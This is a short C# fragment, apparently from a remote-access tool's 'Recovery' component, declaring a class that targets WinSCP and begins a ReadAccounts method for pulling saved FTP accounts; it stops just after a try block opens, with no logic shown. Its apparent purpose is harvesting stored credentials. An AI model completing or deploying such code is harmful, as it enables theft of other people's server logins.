...
namespace Comet.Client.Recovery.FtpClients
{
    public class GetWinScp : IUsers
    {
        /// <inheritdoc />
        public string ApplicationName => "WinSCP";

        /// <inheritdoc />
        public IEnumerable<SaveUser> ReadAccounts()
        {
            List<SaveUser> data = new List<SaveUser>();
            try
            {
